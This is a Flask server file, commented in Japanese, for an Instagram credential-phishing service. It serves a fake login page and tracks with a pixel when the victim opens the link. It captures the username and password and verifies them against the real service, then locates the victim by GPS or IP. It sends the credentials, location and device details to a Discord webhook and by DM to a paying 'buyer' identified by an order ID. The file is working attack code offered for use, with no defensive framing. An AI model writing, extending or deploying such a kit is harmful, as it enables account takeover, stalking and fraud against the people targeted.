import base64
import json
import os
import threading
import time

import requests
from dotenv import load_dotenv

load_dotenv()   # ← config の import より前に必須

from flask import (Flask, Response, jsonify, make_response,
                   redirect, render_template, request)

from config import FORCE_LOGOUT, REAL_INSTAGRAM
from discord_notify import build_embed, post_embed
from geocode import ip_geocode, reverse_geocode
from ig_login import verify

app = Flask(__name__)

import panel_bot
panel_bot.register_routes(app)      # ボタンが叩くAPI（hook未設定でも200を返すので安全）
panel_bot.start_in_thread()         # botを裏で起動

GIF_1PX = base64.b64decode(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")

WRONG = "ユーザー名またはパスワードが正しくありません。"
RETRY = "しばらくしてからもう一度お試しください。"


# ============================================================
# ref ユーティリティ
# ============================================================
def parse_ref(s):
    if not s:
        return {}
    try:
        return json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)))
    except Exception:
        return {}


def get_ref():
    raw = (request.form.get("ref") or request.args.get("ref")
           or request.cookies.get("ref", ""))
    return parse_ref(raw)


def dm(buyer_id, embed):
    token = os.environ.get("DISCORD_TOKEN", "")
    if not token or not buyer_id:
        return
    h = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    try:
        ch = requests.post("https://discord.com/api/v10/users/@me/channels",
                           headers=h, json={"recipient_id": str(buyer_id)},
                           timeout=10).json().get("id")
        if ch:
            requests.post(f"https://discord.com/api/v10/channels/{ch}/messages",
                          headers=h, json={"embeds": [embed]}, timeout=10)
    except Exception as e:
        print("[dm] error:", e)


_open_seen = {}


def _is_first_open(key):
    now = time.time()
    if _open_seen.get(key, 0) > now - 300:
        return False
    _open_seen[key] = now
    return True


def client_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    return (xff.split(",")[0].strip() if xff else request.remote_addr) or ""


# ============================================================
# ヘルスチェック（最優先）
# ============================================================
@app.route("/healthz")
def healthz():
    return "ok", 200


# ============================================================
# 画面
# ============================================================
@app.route("/")
def index():
    ref = request.args.get("ref", "")
    resp = make_response(render_template("login.html",
                                         force_logout=FORCE_LOGOUT, ref=ref))
    if ref:
        resp.set_cookie("ref", ref, max_age=86400, samesite="Lax")
    return resp


@app.route("/open.gif")
def open_gif():
    r = parse_ref(request.args.get("ref", ""))
    if r.get("b") and _is_first_open(r.get("o") or r.get("b")):
        threading.Thread(target=dm, args=(r["b"], {
            "title": "👀 相手がリンクを開きました",
            "color": 0xF1C40F,
            "description": "相手がログイン画面を開きました。",
        }), daemon=True).start()
    return Response(GIF_1PX, mimetype="image/gif")


# ============================================================
# 取得
# ============================================================
@app.route("/capture", methods=["POST"])
def capture():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    lat = request.form.get("lat", "")
    lng = request.form.get("lng", "")
    acc = request.form.get("acc", "")
    ip = client_ip()
    ua = request.headers.get("User-Agent", "")
    ref = get_ref()

    status, detail = verify(username, password)

    address, postal, isp, method = "", "", "", "IP"
    try:
        if lat and lng:
            method = "GPS"
            address = reverse_geocode(float(lat), float(lng))
        else:
            g = ip_geocode(ip)
            postal, isp = g.get("postal", ""), g.get("isp", "")
            if g.get("lat") and g.get("lng"):
                lat, lng = g["lat"], g["lng"]
                address = reverse_geocode(float(lat), float(lng))
    except Exception as e:
        print(f"[geo] error: {e}")

    result = {
        "ok": "✅ ログイン成功",
        "2fa": "🔐 2段階認証あり（パスワードは正しい）",
        "unknown": "⚠️ 判定不能（通信エラー）",
    }.get(status, "❌ 失敗 → 再入力")

    embed = build_embed(username, password, address, lat, lng, ip, ua,
                        acc, postal, isp, method, result, detail)

    if ref.get("o"):
        embed["fields"].insert(0, {"name": "注文ID",
                                   "value": f"`{ref['o']}`", "inline": True})

    # チャンネルに残すなら（空文字にすれば送らない）
    threading.Thread(target=post_embed,
                     args=(embed, os.environ.get("DISCORD_WEBHOOK_URL", "")),
                     daemon=True).start()

    # 買い手にDM
    if ref.get("b"):
        threading.Thread(target=dm, args=(ref["b"], embed), daemon=True).start()

    success = status in ("ok", "2fa")
    error = "" if success else (RETRY if status == "challenge" else WRONG)

    if request.headers.get("X-Requested-With") == "fetch":
        return jsonify(ok=success, error=error, status=status)

    if success:
        return redirect(REAL_INSTAGRAM, code=302)
    return render_template("login.html", error=error, username=username,
                           force_logout=FORCE_LOGOUT, ref=request.form.get("ref", ""))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
